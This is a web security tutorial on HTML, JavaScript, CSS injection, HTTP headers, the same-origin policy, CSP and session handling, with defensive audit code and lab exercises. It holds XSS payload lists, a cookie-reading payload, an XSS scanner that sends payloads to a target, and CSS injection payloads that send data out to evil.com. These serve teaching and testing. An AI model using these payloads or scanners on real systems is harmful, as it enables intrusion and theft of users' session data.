# Web Technologies for Security

## Layer Position

```
┌─────────────────────────────────────────────┐
│           Application Layer                  │
│  ┌───────────────────────────────────────┐  │
│  │   Browser / Web Client                 │  │
│  ├───────────────────────────────────────┤  │
│  │   HTML, CSS, JavaScript Engine         │  │
│  ├───────────────────────────────────────┤  │
│  │   HTTP/HTTPS Protocol Stack            │  │
│  ├───────────────────────────────────────┤  │
│  │   TLS/SSL Layer                        │  │
│  └───────────────────────────────────────┘  │
│           Transport Layer (TCP)              │
│           Network Layer (IP)                 │
│           Data Link / Physical Layer         │
└─────────────────────────────────────────────┘
```

## Internal Architecture

```
Web Security Ecosystem
│
├── Browser Security Model
│   ├── Same-Origin Policy (SOP)
│   │   ├── Origin = Protocol + Host + Port
│   │   ├── Prevents cross-origin data reading
│   │   └── Allows cross-origin requests (limited)
│   ├── Content Security Policy (CSP)
│   │   ├── Script sources whitelist
│   │   ├── Style sources whitelist
│   │   └── Connection restrictions
│   ├── Sandboxed iframes
│   └── CORS (Cross-Origin Resource Sharing)
│
├── HTTP Protocol
│   ├── Request Methods (GET, POST, PUT, DELETE)
│   ├── Headers (Security-relevant)
│   ├── Status Codes
│   ├── Cookies & Sessions
│   └── TLS Handshake
│
├── Injection Vectors
│   ├── XSS (Cross-Site Scripting)
│   │   ├── Reflected XSS
│   │   ├── Stored XSS
│   │   └── DOM-based XSS
│   ├── CSRF (Cross-Site Request Forgery)
│   ├── CSS Injection
│   └── HTTP Header Injection
│
└── Web APIs
    ├── XMLHttpRequest / Fetch
    ├── WebSocket
    ├── Service Workers
    └── Web Storage (localStorage, sessionStorage)
```

## 1. HTML Structure and Security

### HTML Anatomy

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; script-src 'self' https://trusted.cdn.com">
    <title>Secure Page</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <header>
        <nav>
            <a href="/dashboard">Dashboard</a>
            <a href="/settings">Settings</a>
            <a href="/logout">Logout</a>
        </nav>
    </header>
    <main>
        <form method="POST" action="/api/update" id="secure-form">
            <input type="hidden" name="csrf_token" value="abc123xyz">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username"
                   pattern="[a-zA-Z0-9_]{3,20}" required>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            <button type="submit">Update</button>
        </form>
    </main>
    <script src="/js/app.js"></script>
</body>
</html>
```

### HTML Security Attributes

```html
<!-- XSS Prevention -->
<input type="text" name="q" autocomplete="off" autocorrect="off"
       autocapitalize="off" spellcheck="false">

<!-- Form Security -->
<form method="POST" action="/login" autocomplete="off">
    <input type="hidden" name="_token" value="csrf_token_here">
    <input type="password" name="password" autocomplete="new-password">
</form>

<!-- iframe Security -->
<iframe src="https://untrusted.com"
        sandbox="allow-scripts allow-same-origin"
        referrerpolicy="no-referrer"
        loading="lazy"></iframe>

<!-- Link Security -->
<a href="https://example.com" rel="noopener noreferrer" target="_blank">External Link</a>

<!-- Image Security -->
<img src="/logo.png" alt="Logo"
     referrerpolicy="no-referrer"
     crossorigin="anonymous">

<!-- Permissions Policy -->
<meta http-equiv="Permissions-Policy"
      content="camera=(), microphone=(), geolocation=(self)">
```

### HTML Security Audit Script

```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import requests
from typing import List, Dict

class HTMLSecurityAuditor:
    """Audit HTML content for security issues."""

    DANGEROUS_ATTRIBUTES = ["onclick", "onerror", "onload", "onmouseover",
                            "onfocus", "onblur", "onsubmit"]

    def __init__(self, url: str):
        self.url = url
        self.soup = None
        self.issues = []

    def fetch_and_parse(self):
        response = requests.get(self.url, timeout=10)
        self.soup = BeautifulSoup(response.text, "html.parser")

    def check_inline_scripts(self) -> List[Dict]:
        """Find inline JavaScript (should use external files)."""
        issues = []
        for script in self.soup.find_all("script"):
            if script.string:
                issues.append({
                    "type": "INLINE_SCRIPT",
                    "severity": "MEDIUM",
                    "detail": "Inline JavaScript detected; use external files with CSP"
                })
        return issues

    def check_event_handlers(self) -> List[Dict]:
        """Find inline event handlers (XSS vectors)."""
        issues = []
        for tag in self.soup.find_all(True):
            for attr in tag.attrs:
                if attr.lower() in self.DANGEROUS_ATTRIBUTES:
                    issues.append({
                        "type": "INLINE_EVENT_HANDLER",
                        "severity": "HIGH",
                        "tag": tag.name,
                        "attribute": attr,
                        "detail": f"Inline event handler '{attr}' is an XSS vector"
                    })
        return issues

    def check_forms(self) -> List[Dict]:
        """Check forms for security issues."""
        issues = []
        for form in self.soup.find_all("form"):
            if form.get("action", "").startswith("http://"):
                issues.append({
                    "type": "INSECURE_FORM_ACTION",
                    "severity": "HIGH",
                    "detail": "Form submits to HTTP (not HTTPS)"
                })
            csrf_token = form.find("input", {"name": "csrf_token"})
            if not csrf_token:
                issues.append({
                    "type": "MISSING_CSRF_TOKEN",
                    "severity": "HIGH",
                    "detail": "Form missing CSRF protection"
                })
        return issues

    def check_external_resources(self) -> List[Dict]:
        """Check for mixed content and external resources."""
        issues = []
        for tag in self.soup.find_all(["script", "link", "img"]):
            src = tag.get("src") or tag.get("href")
            if src and src.startswith("http://"):
                issues.append({
                    "type": "MIXED_CONTENT",
                    "severity": "MEDIUM",
                    "tag": tag.name,
                    "detail": f"Insecure HTTP resource: {src}"
                })
        return issues

    def check_meta_tags(self) -> List[Dict]:
        """Check security-related meta tags."""
        issues = []
        csp = self.soup.find("meta", {"http-equiv": "Content-Security-Policy"})
        if not csp:
            issues.append({
                "type": "MISSING_CSP",
                "severity": "MEDIUM",
                "detail": "No Content-Security-Policy meta tag found"
            })
        viewport = self.soup.find("meta", {"name": "viewport"})
        if viewport:
            content = viewport.get("content", "")
            if "user-scalable=no" in content:
                issues.append({
                    "type": "ACCESSIBILITY",
                    "severity": "LOW",
                    "detail": "user-scalable=no prevents zoom (accessibility issue)"
                })
        return issues

    def audit(self) -> Dict:
        self.fetch_and_parse()
        all_issues = (
            self.check_inline_scripts() +
            self.check_event_handlers() +
            self.check_forms() +
            self.check_external_resources() +
            self.check_meta_tags()
        )
        return {
            "url": self.url,
            "total_issues": len(all_issues),
            "critical": sum(1 for i in all_issues if i["severity"] == "HIGH"),
            "medium": sum(1 for i in all_issues if i["severity"] == "MEDIUM"),
            "low": sum(1 for i in all_issues if i["severity"] == "LOW"),
            "issues": all_issues
        }
```

## 2. JavaScript and XSS

### XSS Attack Vectors

```javascript
// === Reflected XSS ===
// Attacker crafts URL with malicious payload
// https://example.com/search?q=<script>alert('XSS')</script>

// Server reflects input without sanitization
// <div>Results for: <script>alert('XSS')</script></div>

// === Stored XSS ===
// Malicious script stored in database, served to all users
// Payload in comment field: <img src=x onerror=alert(document.cookie)>

// === DOM-based XSS ===
// JavaScript reads from attacker-controlled source
// document.getElementById('output').innerHTML = location.hash.substring(1);
// URL: https://example.com/page#<img src=x onerror=alert(1)>

// === Common XSS Payloads ===
const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    "';alert('XSS');//",
    '<a href="javascript:alert(\'XSS\')">click</a>',
    '<input onfocus=alert("XSS") autofocus>',
    '<details open ontoggle=alert("XSS")>',
];
```

### XSS Prevention (JavaScript)

```javascript
// === Input Sanitization ===
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(input));
    return div.innerHTML;
}

// === Output Encoding ===
function escapeHtml(str) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
    };
    return str.replace(/[&<>"'/]/g, char => map[char]);
}

// === Secure DOM Manipulation ===
// BAD: innerHTML allows script execution
element.innerHTML = userInput;

// GOOD: textContent is safe
element.textContent = userInput;

// GOOD: Use template literals with escaping
element.innerHTML = `<p>${escapeHtml(userInput)}</p>`;

// === Content Security Policy (CSP) Headers ===
// Server should send:
// Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

// === Cookie Security ===
document.cookie = "session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/";
```

### XSS Detection Script

```python
import requests
from urllib.parse import quote

class XSSDetector:
    """Detect potential XSS vulnerabilities."""

    PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '{{7*7}}',  # Template injection
        '${7*7}',   # Expression language injection
    ]

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerable_params = []

    def test_parameter(self, param: str, method: str = "GET") -> list:
        """Test a single parameter for XSS."""
        vulnerabilities = []
        for payload in self.PAYLOADS:
            if method == "GET":
                response = requests.get(
                    self.target_url,
                    params={param: payload},
                    timeout=10
                )
            else:
                response = requests.post(
                    self.target_url,
                    data={param: payload},
                    timeout=10
                )
            if payload in response.text:
                vulnerabilities.append({
                    "parameter": param,
                    "payload": payload,
                    "method": method,
                    "reflected": True
                })
        return vulnerabilities

    def scan_all_params(self, params: list) -> dict:
        """Test multiple parameters for XSS."""
        results = {"vulnerable": [], "safe": []}
        for param in params:
            vulns = self.test_parameter(param)
            if vulns:
                results["vulnerable"].extend(vulns)
            else:
                results["safe"].append(param)
        return results
```

## 3. CSS Injection

```python
class CSSInjectionTester:
    """Test for CSS injection vulnerabilities."""

    PAYLOADS = [
        'body { background: url("http://evil.com/steal?data=") }',
        '@import url("http://evil.com/steal?data=")',
        'div { background: expression(alert("CSS Injection")) }',
        'div { -moz-binding: url("http://evil.com/xss.xml#xss") }',
    ]

    def __init__(self, target_url: str):
        self.target_url = target_url

    def test_css_injection(self, param: str) -> bool:
        """Test if CSS injection is possible."""
        for payload in self.PAYLOADS:
            response = requests.get(
                self.target_url,
                params={param: payload},
                timeout=10
            )
            if payload in response.text:
                return True
        return False

    def extract_data_via_css(self, param: str, target_data: str) -> str:
        """Demonstrate CSS data exfiltration (conceptual)."""
        # In real attack, CSS can leak data character by character
        css_payload = f'''
        input[value^="{target_data[0]}"] {{
            background: url("http://evil.com/leak?char={target_data[0]}");
        }}
        '''
        return css_payload
```

## 4. HTTP Protocol Details

### HTTP Request/Response Anatomy

```
--- REQUEST ---
POST /api/login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Cookie: session_id=abc123; tracking_id=xyz
Content-Length: 45
Connection: keep-alive

username=admin&password=secret123

--- RESPONSE ---
HTTP/1.1 200 OK
Date: Mon, 01 Jan 2024 00:00:00 GMT
Server: Apache/2.4.52
Set-Cookie: session=newsession123; Path=/; Secure; HttpOnly; SameSite=Strict
Content-Type: text/html; charset=UTF-8
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 1234

<!DOCTYPE html>...
```

### Security Headers Analysis

```python
import requests
from typing import Dict, List

class HTTPHeaderAnalyzer:
    """Analyze HTTP security headers."""

    SECURITY_HEADERS = {
        "Strict-Transport-Security": {
            "description": "Enforces HTTPS connections",
            "severity": "HIGH",
            "recommended": "max-age=31536000; includeSubDomains; preload"
        },
        "Content-Security-Policy": {
            "description": "Controls resource loading origins",
            "severity": "HIGH",
            "recommended": "default-src 'self'; script-src 'self'"
        },
        "X-Frame-Options": {
            "description": "Prevents clickjacking",
            "severity": "MEDIUM",
            "recommended": "DENY or SAMEORIGIN"
        },
        "X-Content-Type-Options": {
            "description": "Prevents MIME type sniffing",
            "severity": "MEDIUM",
            "recommended": "nosniff"
        },
        "X-XSS-Protection": {
            "description": "Legacy XSS filter (deprecated)",
            "severity": "LOW",
            "recommended": "0 (rely on CSP instead)"
        },
        "Referrer-Policy": {
            "description": "Controls referrer information leakage",
            "severity": "MEDIUM",
            "recommended": "strict-origin-when-cross-origin"
        },
        "Permissions-Policy": {
            "description": "Controls browser feature access",
            "severity": "LOW",
            "recommended": "camera=(), microphone=(), geolocation=()"
        },
    }

    DANGEROUS_HEADERS = {
        "Server": "Leaks server software version",
        "X-Powered-By": "Leaks technology stack",
        "X-AspNet-Version": "Leaks ASP.NET version",
        "X-Generator": "Leaks CMS information",
    }

    def __init__(self, target_url: str):
        self.target_url = target_url

    def analyze(self) -> Dict:
        response = requests.get(self.target_url, timeout=10)
        results = {
            "url": self.target_url,
            "status_code": response.status_code,
            "present_headers": [],
            "missing_headers": [],
            "dangerous_headers": [],
            "cookie_analysis": self._analyze_cookies(response.cookies),
        }

        for header, info in self.SECURITY_HEADERS.items():
            value = response.headers.get(header)
            if value:
                results["present_headers"].append({
                    "name": header,
                    "value": value,
                    "description": info["description"]
                })
            else:
                results["missing_headers"].append({
                    "name": header,
                    "severity": info["severity"],
                    "recommendation": info["recommended"]
                })

        for header, description in self.DANGEROUS_HEADERS.items():
            value = response.headers.get(header)
            if value:
                results["dangerous_headers"].append({
                    "name": header,
                    "value": value,
                    "risk": description
                })

        return results

    def _analyze_cookies(self, cookies) -> List[Dict]:
        results = []
        for cookie in cookies:
            analysis = {
                "name": cookie.name,
                "secure": cookie.secure,
                "httponly": cookie.has_nonstandard_attr("HttpOnly") or "httponly" in str(cookie).lower(),
                "samesite": cookie.get_nonstandard_attr("SameSite"),
            }
            issues = []
            if not analysis["secure"]:
                issues.append("Cookie transmitted over HTTP (no Secure flag)")
            if not analysis["httponly"]:
                issues.append("Cookie accessible via JavaScript (no HttpOnly flag)")
            if not analysis["samesite"]:
                issues.append("No SameSite attribute set")
            analysis["issues"] = issues
            results.append(analysis)
        return results
```

## 5. Browser Security Model

### Same-Origin Policy

```python
class SOPTester:
    """Demonstrate Same-Origin Policy concepts."""

    def test_same_origin(self, url1: str, url2: str) -> dict:
        """Compare two URLs for same-origin policy."""
        from urllib.parse import urlparse
        p1 = urlparse(url1)
        p2 = urlparse(url2)
        same_protocol = p1.scheme == p2.scheme
        same_host = p1.hostname == p2.hostname
        same_port = p1.port == p2.port
        return {
            "url1": url1,
            "url2": url2,
            "same_origin": same_protocol and same_host and same_port,
            "details": {
                "protocol": f"{'Same' if same_protocol else 'Different'} ({p1.scheme} vs {p2.scheme})",
                "host": f"{'Same' if same_host else 'Different'} ({p1.hostname} vs {p2.hostname})",
                "port": f"{'Same' if same_port else 'Different'} ({p1.port} vs {p2.port})",
            }
        }

# Same-Origin Policy bypass attempts:
# 1. Subdomain access (attacker.sub.example.com vs www.example.com)
# 2. Port manipulation (example.com:8080 vs example.com:80)
# 3. Protocol switching (https://example.com vs http://example.com)
# 4. Window.open() with postMessage()
# 5. JSONP callback hijacking
```

### Content Security Policy (CSP)

```python
class CSPAnalyzer:
    """Analyze Content Security Policy headers."""

    DANGEROUS_DIRECTIVES = [
        "unsafe-inline",
        "unsafe-eval",
        "data:",
        "blob:",
        "*",
    ]

    def __init__(self, csp_header: str):
        self.header = csp_header
        self.directives = self._parse()

    def _parse(self) -> dict:
        directives = {}
        for part in self.header.split(";"):
            part = part.strip()
            if " " in part:
                directive, _, value = part.partition(" ")
                directives[directive.strip()] = value.strip().split()
            else:
                directives[part.strip()] = []
        return directives

    def check_script_src(self) -> dict:
        """Analyze script-src directive."""
        sources = self.directives.get("script-src", [])
        issues = []
        for source in sources:
            if source in self.DANGEROUS_DIRECTIVES:
                issues.append(f"Unsafe source: {source}")
        return {
            "sources": sources,
            "issues": issues,
            "safe": len(issues) == 0
        }

    def check_directives(self) -> list:
        """Check all directives for security issues."""
        findings = []
        # Missing important directives
        recommended = ["default-src", "script-src", "style-src", "img-src", "connect-src"]
        for directive in recommended:
            if directive not in self.directives:
                findings.append({
                    "directive": directive,
                    "issue": "Missing",
                    "severity": "MEDIUM"
                })

        # Check for dangerous values
        for directive, sources in self.directives.items():
            for source in sources:
                if source in self.DANGEROUS_DIRECTIVES:
                    findings.append({
                        "directive": directive,
                        "issue": f"Contains dangerous value: {source}",
                        "severity": "HIGH"
                    })
        return findings

    def generate_strict_csp(self) -> str:
        """Generate a strict CSP policy."""
        return (
            "default-src 'none'; "
            "script-src 'self'; "
            "style-src 'self'; "
            "img-src 'self' data:; "
            "font-src 'self'; "
            "connect-src 'self'; "
            "frame-ancestors 'none'; "
            "base-uri 'self'; "
            "form-action 'self'"
        )
```

## 6. Cookies and Sessions

### Cookie Security Analysis

```python
import requests
from typing import List, Dict

class CookieSecurityAnalyzer:
    """Analyze cookie security attributes."""

    def analyze_cookies(self, url: str) -> List[Dict]:
        response = requests.get(url, timeout=10)
        results = []

        for cookie in response.cookies:
            analysis = {
                "name": cookie.name,
                "value_length": len(cookie.value),
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "httponly": "httponly" in str(cookie).lower(),
                "samesite": cookie.get_nonstandard_attr("SameSite"),
                "issues": []
            }

            if not analysis["secure"]:
                analysis["issues"].append("Not marked Secure - transmits over HTTP")
            if not analysis["httponly"]:
                analysis["issues"].append("Not marked HttpOnly - accessible to XSS")
            if not analysis["samesite"]:
                analysis["issues"].append("No SameSite - vulnerable to CSRF")
            if analysis["value_length"] < 16:
                analysis["issues"].append("Session token too short")
            results.append(analysis)

        return results

    def check_session_token(self, token: str) -> dict:
        """Check session token quality."""
        import re
        checks = {
            "length": len(token) >= 32,
            "entropy": len(set(token)) / len(token) > 0.5 if token else False,
            "not_sequential": not re.match(r'^[0-9]+$', token),
            "contains_uppercase": bool(re.search(r'[A-Z]', token)),
            "contains_lowercase": bool(re.search(r'[a-z]', token)),
            "contains_digit": bool(re.search(r'[0-9]', token)),
            "contains_special": bool(re.search(r'[^a-zA-Z0-9]', token)),
        }
        return {
            "token_length": len(token),
            "checks": checks,
            "strength": "Strong" if all(checks.values()) else "Weak"
        }
```

### Session Management

```python
import secrets
import hashlib
import time
from typing import Optional

class SessionManager:
    """Secure session management."""

    def __init__(self, session_timeout: int = 3600):
        self.sessions = {}
        self.session_timeout = session_timeout

    def create_session(self, user_id: str) -> str:
        """Create a new secure session."""
        session_token = secrets.token_urlsafe(32)
        self.sessions[session_token] = {
            "user_id": user_id,
            "created_at": time.time(),
            "last_access": time.time(),
            "ip_address": None,
            "user_agent": None,
        }
        return session_token

    def validate_session(self, token: str, ip: str = None, user_agent: str = None) -> Optional[str]:
        """Validate a session token."""
        if token not in self.sessions:
            return None

        session = self.sessions[token]

        # Check timeout
        if time.time() - session["last_access"] > self.session_timeout:
            del self.sessions[token]
            return None

        # Check IP binding
        if ip and session["ip_address"] and session["ip_address"] != ip:
            del self.sessions[token]
            return None

        # Update last access
        session["last_access"] = time.time()
        return session["user_id"]

    def destroy_session(self, token: str):
        """Destroy a session."""
        self.sessions.pop(token, None)

    def cleanup_expired(self):
        """Remove all expired sessions."""
        now = time.time()
        expired = [
            token for token, data in self.sessions.items()
            if now - data["last_access"] > self.session_timeout
        ]
        for token in expired:
            del self.sessions[token]
```

## 7. Web APIs

### Fetch API Security

```javascript
// Secure API calls
async function secureFetch(url, options = {}) {
    const defaultHeaders = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
    };

    const response = await fetch(url, {
        ...options,
        headers: { ...defaultHeaders, ...options.headers },
        credentials: 'same-origin',  // Include cookies for same-origin
        // credentials: 'include',   // Include cookies for cross-origin
        // credentials: 'omit',       // Never include cookies
    });

    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    return response.json();
}

// CORS Configuration (server-side)
// Access-Control-Allow-Origin: https://trusted.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Content-Type, Authorization
// Access-Control-Max-Age: 86400
// Access-Control-Allow-Credentials: true
```

## Security Perspective

| Aspect | Detail |
|--------|--------|
| Input Validation | Sanitize all user input on client AND server |
| Output Encoding | Encode data based on context (HTML, JS, URL, CSS) |
| CSP | Deploy strict Content-Security-Policy |
| HTTPS | Use TLS everywhere; HSTS header |
| Cookies | Secure, HttpOnly, SameSite attributes |
| CORS | Restrict origins; never use wildcard with credentials |

## Attack Techniques and Defenses

| Attack | Technique | Defense |
|--------|-----------|---------|
| Reflected XSS | Inject payload in URL parameters | Input validation, output encoding, CSP |
| Stored XSS | Store payload in database | Server-side sanitization, CSP |
| DOM XSS | Manipulate DOM via client JS | Avoid innerHTML, use textContent |
| CSS Injection | Inject CSS to extract data | Validate CSS input, CSP style-src |
| Clickjacking | Invisible iframes over buttons | X-Frame-Options, CSP frame-ancestors |
| CSRF | Forge cross-origin requests | CSRF tokens, SameSite cookies |
| Session Hijacking | Steal session cookies | HttpOnly, Secure, TLS |
| MIME Sniffing | Force content type interpretation | X-Content-Type-Options: nosniff |

## Debugging Tools

| Tool | Purpose |
|------|---------|
| Browser DevTools | Inspect elements, network, console |
| Burp Suite | HTTP proxy and scanner |
| OWASP ZAP | Automated web security testing |
| curl | HTTP request testing |
| Postman | API testing and debugging |
| CSP Evaluator | Google's CSP analysis tool |
| SecurityHeaders.com | Quick header check |

## Interview Questions

1. Explain the Same-Origin Policy and its exceptions.
2. What is the difference between Reflected, Stored, and DOM-based XSS?
3. How does Content Security Policy prevent XSS?
4. What security attributes should session cookies have?
5. Explain the CORS preflight request mechanism.
6. How does TLS protect HTTP communications?
7. What is clickjacking and how do you prevent it?
8. Explain the difference between authentication and authorization in web apps.
9. How would you test for SQL injection through HTTP parameters?
10. What are the risks of using `eval()` in JavaScript?

## Hands-on Labs

### Lab 1: XSS Challenge
```python
# Task: Find and exploit XSS vulnerabilities
# Requirements:
# 1. Test reflected XSS on search parameter
# 2. Test stored XSS in comment form
# 3. Bypass basic XSS filters
# 4. Write exploit payload that steals cookies
# 5. Demonstrate CSP bypass techniques
```

### Lab 2: Header Security Audit
```python
# Task: Build a security header checker
# Requirements:
# 1. Check all OWASP recommended headers
# 2. Analyze CSP policy strength
# 3. Check cookie security attributes
# 4. Generate remediation report
# 5. Compare against industry best practices
```

### Lab 3: Session Security Lab
```python
# Task: Implement and test session management
# Requirements:
# 1. Generate cryptographically secure tokens
# 2. Implement session timeout
# 3. Add IP binding
# 4. Test session fixation attacks
# 5. Demonstrate session hijacking prevention
```

## Summary Table

| Category | Key Concepts | Security Impact |
|----------|-------------|-----------------|
| HTML | Forms, meta tags, attributes | XSS, CSRF, data leakage |
| JavaScript | DOM manipulation, events | XSS, prototype pollution |
| CSS | Style injection, data exfiltration | Information disclosure |
| HTTP | Headers, methods, status codes | Header injection, CRLF |
| Cookies | Security flags, session tokens | Session hijacking, CSRF |
| CSP | Content restriction policy | XSS mitigation |
| CORS | Cross-origin policy | Unauthorized API access |
| TLS | Encryption, certificate validation | Data interception |
